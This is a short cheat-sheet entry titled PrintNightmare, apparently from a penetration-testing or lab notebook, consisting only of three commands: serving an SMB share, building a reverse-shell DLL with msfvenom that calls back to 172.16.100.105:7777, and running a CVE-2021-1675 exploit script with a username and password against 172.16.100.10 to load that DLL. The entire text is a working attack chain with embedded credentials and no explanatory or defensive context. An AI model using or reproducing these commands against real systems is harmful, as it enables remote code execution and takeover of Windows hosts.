###  PrintNightmare 

```
python3 smbserver.py -smb2support share /root/share/
msfvenom -p windows/x64/shell_reverse_tcp LHOST=172.16.100.105 LPORT=7777 -f dll -o  shell.dll
python3 CVE-2021-1675.py elastic.me/John:123456789aA@172.16.100.10 '\\172.16.100.105\share\shell.dll'
```
